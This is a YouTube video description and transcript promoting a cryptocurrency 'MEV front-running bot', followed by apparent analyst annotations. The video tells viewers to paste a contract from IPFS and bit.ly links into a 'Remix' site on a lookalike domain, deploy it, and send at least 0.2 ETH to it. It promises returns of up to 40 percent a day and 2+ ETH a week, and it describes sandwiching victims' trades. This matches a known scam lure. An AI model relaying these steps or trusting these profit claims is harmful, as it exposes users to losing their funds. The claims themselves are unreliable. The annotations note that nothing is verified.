description: *:check mark button:Updated Code: Working as of June 24 , 2023*  If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.  For your questions, you can PM me on Telegram:   Crypto1392 (Please only ask contract related questions)    ****** STEP BY STEP INSTRUCTIONS ******  1. Download MetaMask: :pushpin:https://metamask.io/download.html  2. Access Remix:  :pushpin:https://www.remixcompiler.pro  3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"  4. Paste SmartContract in Remix:  :pushpin:ipfs.io/ipfs/QmexzRc23fzJZQH7S5npjBixNJAT8gnJQumaGcPANxRBUu       (Mirror link) :pushpin:https://bit.ly/3nHeaeb  5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it  6. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now  7. Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address  8. After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'   Learn more about MEV here: www.ethereum.org/en/developers/docs/mev/  Please share your results below,  subscribe and like the video.  :police car light:EDIT: I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.2 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.2 ETH to make sure that won't happen.

asr.full_text: In this YouTube video tutorial, I'll be explaining to you an easy method to make passive income using Uniswap. Have you ever made a transaction in Uniswap where you forgot to decrease the slippage? If so, you may have received less tokens than you were expecting. This is because your transaction has been front-run by a bot who takes advantage of the slippage. So basically, in this video, we will be talking about how to build a smart contract bot who does the same. My smart contract bot, which I'll call a front-running bot, will allow you to automatically trade a given token for the Ethereum blockchain on Uniswap and 1inch without having to go through all the typical transaction methods. This is going to allow us to sniff the pending transactions that are not yet mined on the mempool and are going to allow us to inject our transaction with a higher gas fee than the transaction which is entered. This will allow our transaction to be processed first and then we'll also send a sell order within the same block. So basically the victims transaction gets sandwiched between ours and we make a profit from the slippage difference in the transaction. To start off you will need to have meta mask installed and connected to the etherium mainnet. If you don't have meta mask installed you can find a link in the description on how to install it remix. Which is a web application that allows us to develop, deploy, compile, and launch smart contracts. Coded in the Solidity language. You will find in the description the link to the Remix website. Now head over to the left sidebar and create a new file named bot.sol. Next, if you look at the description, I've included a link to this code. You just need to copy and. Paste that. This is our frontrunner bot contract that we will deploy. The couple of things to look. At after pasting the code are line 55 and 56. If you check the addresses on Etherscan,. You'll see that these are the addresses of wrapped Ether tokens. Yes, as you can see,. It's the official wrapped Ether address. Always a good idea to check that. Back to Remix. Now that our bot file is ready, let's compile it. On the side menu,. Click Solidity Compiler. As you can see, the contract is built for the 0.6.6 version of. Of Solidity. Under Compiler, select the version 0.6.6 so it will match our contract. Also,. Make sure the language is set to Solidity and the EVM version set to Default. Now click. On Compile Bot.sol and wait for the bot to compile. So now we will deploy this to our. Wallet. Head over to the Deploy and Run Transactions on Remix. Under the Environment, select Injected. Web 3 to connect Remix to our MetaMask. Now the deployment utility is ready. Click that deploy button to publish our contract to the Ethereum blockchain. We need to confirm. The creation of our contract by paying some gas fees. I always set gas fees to high to. Speed up the transactions. Not a lot of difference. Now click confirm and wait for the transaction. To be mined. Transaction confirmed. Now our contract is deployed. As we can see here there are four actions for a contract. Start button will start the bot sniffing the mempool. Withdrawal will stop the bot and transfer funds back to your wallet. Token name and token symbols speak for themselves. So let's copy the contract address and make sure it was created. Head back to Etherscan and paste it. Yep, it was created successfully. So the next step is to fund our contract with some ethers to be able to snipe liquidity pools. I'm going to copy this address and head back over to my Metamask. Make sure you've copied the right address. You can fund the contract with whatever amount you want,. But obviously the more you put in, the larger the transaction you will be able to front run. And the more profit you will be able to accumulate over time. So for instance, say you are only front running with 0.5 ethers,. You won't be able to create as much slippage in the price as if you were inserting something like 20 Ethers. Sweet, there we go. Transaction confirmed and the contract is fully funded. We can check that by following our contract address on etherscan.io. As you can see, our contract has one Ethereum on its balance, which is basically the amount we have funded it with. The last step is to click start. This will enable the bot to start sniffing the mempool to find different liquidity pairs in order for you to front run transactions. I'll see you guys in a couple of hours. Well guys, I want to share the profit the bot made for me. So, I have something around 1.17 Ether, which is around 17%. So I'll see you in 10 hours. Alright guys, let's see how much more we made. Oh, it's about 1.37 Ether, so basically it took me about a day to gain my deposit by. More than a third, something close to 40%, which isn't that bad. So the bot will continue to run until you press the withdrawal button. The bot will then exit the liquidity pool and will return back to your wallet. The ethers you entered initially plus the profit. So let's click it. This will charge us a little bit of gas. I'll set it to high again and then we click confirm. There we go. Let's go to our MetaMask to check what I've got now. Yep, as you can see, the balance from the bot is now in my wallet. I've had some weeks where I made 5-6 Ethers. Sometimes it's not always profitable and profits fluctuate week to week. But usually I make 2 plus Ethereum a week. If you have any questions you can contact me on Telegram. I've put the link to my Telegram below so guys share your profits in the comments below,. Hit the like button if you found this video valuable and don't forget to subscribe so. That you'll stay updated.

After the transaction is confirmed, it's your own BOT now
Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address

textual.context: Presented as a promotional instructional tutorial; the supplied records do not independently verify the claimed income or the bot's operation.
textual.potential_relevance: A promised financial return is linked to deploying a contract and transferring at least 0.2 ETH to a specified contract or bot address.
textual.limitations: The records do not establish whether the bot functions as described, whether funds were recovered, or whether any claimed income was genuine.

textual.observation: Viewers are instructed to deploy the contract, transfer ETH to its address, and start it, with the amount transferred described as affecting the size of transactions and potential profit.

the more you put in, the larger the transaction you will be able to front run.

textual.limitations: No transaction records, recipient ownership, or outcome verification are supplied.

textual.observation: The source describes a front-running and sandwich-trading mechanism in which the bot inserts transactions around another user's transaction to profit from slippage.

evidence.quote: This will allow our transaction to be processed first and then we'll also send a sell order within the same block.
So basically the victims transaction gets sandwiched between ours and we make a profit from the slippage difference in the transaction.

textual.limitations: The records do not establish the legality, execution, frequency, or actual financial effect of this mechanism.

It ties the requested funding to claims that the bot can front-run another transaction's slippage and profit, with larger contributions enabling larger transactions. Although the speaker acknowledges that profits fluctuate, the available video evidence describes a direct solicitation based on those profit claims.

The content explicitly presents a market-manipulation mechanism that inserts the bot's transaction before another transaction and uses a same-block sell order to profit from the other transaction's slippage.
